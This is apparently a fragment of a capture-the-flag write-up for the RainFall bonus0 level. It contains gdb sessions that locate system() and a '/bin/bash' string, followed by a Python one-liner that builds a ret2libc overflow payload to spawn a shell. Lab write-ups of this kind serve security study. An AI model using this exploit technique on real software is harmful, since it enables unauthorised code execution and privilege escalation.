

```Shell
(gdb) start
Temporary breakpoint 1 at 0x80485a7
Starting program: /home/user/bonus0/bonus0 

Temporary breakpoint 1, 0x080485a7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```Shell
(gdb) x/s *((char **) environ)
0xbffff913:      "SHELL=/bin/bash"
(gdb) x/s 0xbffff919
0xbffff919:      "/bin/bash"
```

```Shell
bonus0@RainFall:~$ python -c 'print "a\n" + "a" * 4096 + "\x60\xb0\xe6\xb7" + "ABCD" + "\x19\xf9\xff\xbf"' > /tmp/exploit
bonus0@RainFall:~$ ./bonus0 < /tmp/exploit
```
